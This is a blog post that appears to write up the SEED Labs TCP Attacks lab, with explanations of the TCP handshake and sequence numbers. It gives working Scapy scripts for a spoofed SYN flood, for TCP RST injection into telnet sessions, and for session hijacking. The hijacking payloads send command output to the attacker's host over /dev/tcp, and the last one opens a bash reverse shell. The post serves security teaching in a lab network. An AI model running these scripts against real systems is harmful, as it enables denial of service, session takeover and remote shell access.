---
layout: post
title: TCP Attacks
categories: [tcp, scapy]
excerpt: To understand TCP attacks, you have to, first of all, understand how TCP works. TCP is a connection-oriented protocol. This simply means that before two hosts that want to exchange information begin the information exchange, both hosts must ascertain that they can in fact talk to one another.
---

To understand TCP attacks, you have to, first of all, understand how TCP works. TCP is a connection-oriented protocol. This simply means that before two hosts that want to exchange information begin the information exchange, both hosts must ascertain that they can in fact talk to one another. They do this via a 3-way handshake
- the client sends a `syn` to the server
- the server receives the `syn` and responds with a `syn ack`
- the client receives the `syn ack` and responds with `ack`
- a TCP session is established

<details>
<summary><b>SeedLabs: TCP Attacks Lab</b></summary>
<div markdown="1">

- [TCP Attacks Lab](https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf)

___
</div></details>

```
Attacker: 10.9.0.1
Server: 10.9.0.5
Client: 10.9.0.6
```

<br>

### SYN Flooding Attack
From the opening paragraph, we have an idea of how TCP works. It establishes connections using the 3-way handshake:
1. `SYN`
2. `SYN-ACK`
3. `ACK`

Should the `client` keep sending `syn` without responding to the `syn ack` it gets back, eventually, the `server` would become overwhelmed and will not be able to take any more requests leading to DoS. This is so because the `server` has a finite queue where it stores `syn` packets. The queue frees up when a corresponding `ack` is received or the `syn` packet is dropped after some time.

We can check the syn queue size for Ubuntu systems via `# sysctl net.ipv4.tcp_max_syn_backlog`. However, Ubuntu systems come with syn flooding protection called syncookies. You can check the status via `# sysctl  net.ipv4.tcp_syncookies`.

A SYN flooding attack can be launched with Python using the code below

```python
#!/bin/env python3
import sys
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

def main():
    # Ensure correct usage
    if len(sys.argv) != 3:
        usage()
        sys.exit(1)
    
    # Unpack values
    ip = IP(dst = sys.argv[1])
    tcp = TCP(dport = int(sys.argv[2]), flags='S')

    print(f'Attacking {sys.argv[1]}...')
    while True:
        # Build packet
        ip.src = str(IPv4Address(getrandbits(32))) # source iP
        tcp.sport = getrandbits(16) # source port
        tcp.seq = getrandbits(32) # sequence number
        
        # Send the packet
        send(ip / tcp, verbose = 0)

def usage():
    print('Usage: ./synflood.py <ip-address> <port>\
    \n\tip-address: IP address of victim\
    \n\tport: Port number to attack\n')
    
    
if __name__ == '__main__':
    main()
```

Some issues can be noticed however
- The attack is a hit-and-miss. This is so because `python` is an interpreted language and doesn't do so well where performance and speed is required. Many of the attacks would prevent a legitimate connection but only for a few seconds
- The attack success rate increases the more the number of attacking instances increase. This means that the more consoles you run the Python code from the better your chances of success.
- This issue is not present however when the attack is launched using the instructor's `c` code. This is because `c` as a compiled language is more than able to keep up with the speed and performance required for the attack to succeed

When the SYN cookie mechanism is enabled `# sysctl  net.ipv4.tcp_syncookies=1` and the attacks are run again, it is noticed that the attacks do not work.

<br>

### TCP RST Attacks on telnet Connections
To successfully perform a `TCP RST` attack, you need to understand how sequence numbers and acknowledgment numbers work. It is through the aid of sequence and acknowledgment numbers that hosts can keep track of the information exchanged between them and thus retransmit any packet that did not make it to its destination.

To establish a `TCP` connection, both the `server` and the `client` choose a sequence number and perform the three-way handshake
- When the `client` wants to send data to the `server`,
  - the `client` sets its sequence number and sets the `PSH ACK` flag in the packet it sends to the `server`. The acknowledgment number set is the `server` (sequence number + payload size).
  - the `client` expects that in the reply it gets, the acknowledgment number will be equal to (its sequence number + the size of the payload) when it sent out the packet to the `server`
- When the `server` receives the data from the `client` and replies
  - the `server` uses the `client` (sequence number + payload size) as the acknowledgment number and sets its sequence number and sends a packet with the `ACK` flag set

Thus to perform the `TCP RST` attack, what matters is that you get the right sequence number. You can ignore the acknowledgment number because these are used to track if the destination received the message sent or not. Also, it is important to note that the server is the one that closes the connection.

I implemented this in two ways

1. sniffing traffic that is destined for the server

    ```python
    #!/usr/bin/env python3
    from scapy.all import *
    from random import getrandbits

    def drop_pkt(pkt):
        # Checks that packet is an acknowledgement packet
        if not pkt[IP][TCP].payload:
            newpkt = IP()/TCP()
            newpkt[IP].src = pkt[IP].dst
            newpkt[IP].dst = pkt[IP].src
            newpkt[TCP].sport = pkt[TCP].dport
            newpkt[TCP].dport = pkt[TCP].sport        
            newpkt[TCP].flags = 'R'
            newpkt[TCP].seq = pkt[TCP].ack
            newpkt[TCP].ack = 0
            send(newpkt, verbose=0)
        
    sniff(iface = 'br-fee11e059dc7', filter = 'tcp dst port 23 && (not ether host 02:42:e4:2c:cc:83)', prn = drop_pkt)
    ```

    since I am sniffing connections destined for the server, I am listening for an acknowledgment that would be sent to the server. This is because I can be sure that the acknowledgment number in the sniffed traffic is the correct sequence number that the server would use to send the next packet. Choosing the wrong sequence number will cause the attack to fail.

2. sniffing traffic that is destined for the server

    ```python
    #!/usr/bin/env python3
    from scapy.all import *
    from random import getrandbits

    def drop_pkt(pkt):
        newpkt = IP()/TCP()
        newpkt[IP].src = pkt[IP].src
        newpkt[IP].dst = pkt[IP].dst
        newpkt[TCP].sport = pkt[TCP].sport
        newpkt[TCP].dport = pkt[TCP].dport        
        newpkt[TCP].flags = 'R'
        newpkt[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
        newpkt[TCP].ack = 0
        send(newpkt, verbose=0)
        print('sent RST...')
        
    sniff(iface = 'br-fee11e059dc7', filter = 'tcp src port 23 && (not ether host 02:42:e4:2c:cc:83)', prn = drop_pkt)
    ```

    Since I am sniffing connections from the server, to use the correct sequence number, the new sequence number will equal the sniffed packet sequence number plus the sniffed packet payload size. Choosing the wrong sequence number will cause the attack to fail.

***TCP RST attack program***

![rst-2-code](https://github.com/iukadike/blog/assets/58455326/b99e5775-765c-4b04-8c6c-0fa7aea7f3cd)

***TCP RST attack client***

![rst-2-telnet](https://github.com/iukadike/blog/assets/58455326/43c3f69e-03e1-4446-a90a-5d9fc43ee869)

***TCP RST attack wireshark***

![rst-2-wireshark](https://github.com/iukadike/blog/assets/58455326/4c83b140-b4c9-47a7-9545-d49ebd78fdde)

From the Wireshark capture, you will notice that there are several `RST` packets sent. This is due to the speed of the program. Before the Python program can take action on a packet sniffed, the programs have moved past that sequence number.

<br>

### TCP Session Hijacking
When a TCP three-way handshake is complete, a TCP session is established. A bad actor can inject commands into a TCP session, thereby taking over that TCP session. A bad actor can send arbitrary commands to the server masquerading as the client.

The following are important for the attack to succeed:
- IP source address
- IP destination address
- TCP source port
- TCP destination port
- TCP sequence number
- TCP acknowledgment number
- TCP flags
- TCP payload

```python
#!/usr/bin/env python3
from scapy.all import *

def send_cmd(pkt):
    if not pkt[IP][TCP].payload:
        newpkt = IP() / TCP() / Raw(load = '\rw > /dev/tcp/10.9.0.1/9090\r')
        newpkt[IP].src = pkt[IP].src
        newpkt[IP].dst = pkt[IP].dst
        newpkt[TCP].sport = pkt[TCP].sport
        newpkt[TCP].dport = pkt[TCP].dport        
        newpkt[TCP].flags = 'PA'
        newpkt[TCP].seq = pkt[TCP].seq
        newpkt[TCP].ack = pkt[TCP].ack
        send(newpkt, verbose=0)
        print('injected payload...')
    
sniff(iface = 'br-fee11e059dc7', filter = 'tcp dst port 23 && (not ether host 02:42:e4:2c:cc:83)', prn = send_cmd)
```

You will need to set up a listener that will catch the response of the command you execute on the server. When the program successfully injects the command, the response is sent to the listener.

***TCP session highjack program***

![hijack-code](https://github.com/iukadike/blog/assets/58455326/0162515f-4342-4a03-baf0-1e1f038537aa)

***TCP session highjack nc listener***

![highjack-listener](https://github.com/iukadike/blog/assets/58455326/6e94013b-2855-4093-b4c5-46f087a2f17f)

***TCP session highjack wireshark***

![highjack-wireshark](https://github.com/iukadike/blog/assets/58455326/21881c5c-2a0f-4bfd-9119-cd59dee8d619)

***TCP session highjack wireshark***

![highjack-r-wireshark](https://github.com/iukadike/blog/assets/58455326/580d736b-b8df-4461-a503-8e1bb6b0d3ef)

The following can be observed from the Wireshark screenshots:
- `packet 58` is the packet sent to the program that is injected into the client's TCP session
- `packet 59` is the server's response to packet number 58, but to the client
- `packet 60` is the client's packet that we highjacked
- `packet 61` is the server's retransmission packet 59 because it expected an `ack` from the client but received none
- since both server and client are expecting an `ack` but never get any, they keep retransmitting the packets in a loop. This has the side effect of making the actual client terminal unusable after the attack.
- `packet 62` to `packet 69` is the server establishing a TCP session with the nc listener, sending the response, and terminating the session.

<br>

### Creating Reverse Shell using TCP Session Hijacking
From the above experiment, once the payload is injected via TCP session highjack, the following happens:
- the code is run on the server
- a TCP session is opened between the server and our listener
- the output of the code is sent to our listener
- the TCP session is closed

Once this happens, there is no way of executing another code on the server except we run our exploit again and hope our victim tries connecting. To bypass this, we can go for running one command that enables running many more commands without running our exploit again. One such is a reverse shell.

Using TCP session highjacking, one can send a reverse shell as a payload.

```python
#!/usr/bin/env python3
from scapy.all import *

def send_cmd(pkt):
    if not pkt[IP][TCP].payload:
        newpkt = IP() / TCP() / Raw(load = '\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1\r')
        newpkt[IP].src = pkt[IP].src
        newpkt[IP].dst = pkt[IP].dst
        newpkt[TCP].sport = pkt[TCP].sport
        newpkt[TCP].dport = pkt[TCP].dport        
        newpkt[TCP].flags = 'PA'
        newpkt[TCP].seq = pkt[TCP].seq
        newpkt[TCP].ack = pkt[TCP].ack
        send(newpkt, verbose=0)
        print('injected reverse shell...')
    
sniff(iface = 'br-fee11e059dc7', filter = 'tcp dst port 23 && (not ether host 02:42:e4:2c:cc:83)', prn = send_cmd)
```

***reverse shell program***

![rvs-shl-code](https://github.com/iukadike/blog/assets/58455326/02d0cf31-5a44-45f3-bf4f-25ef7c83874d)

***reverse shell listener***

![rvs-shell-listener](https://github.com/iukadike/blog/assets/58455326/3c4edf46-9277-4874-ac81-4289a48f358e)

***reverse shell wireshark***

![rvs-shl-wireshark](https://github.com/iukadike/blog/assets/58455326/fc28ead6-7cd7-4461-9c68-765c14b7a097)

***reverse shell wireshark listner***

![rvs-shl-l-wireshark](https://github.com/iukadike/blog/assets/58455326/7cb8b3ef-5b70-4842-b276-4146e8f33a1a)

***reverse shell wireshark server***

![rvs-shl-s-wireshark](https://github.com/iukadike/blog/assets/58455326/aba40d81-c592-4743-a362-12f99ac1c055)


<br>

Thanks for reading...

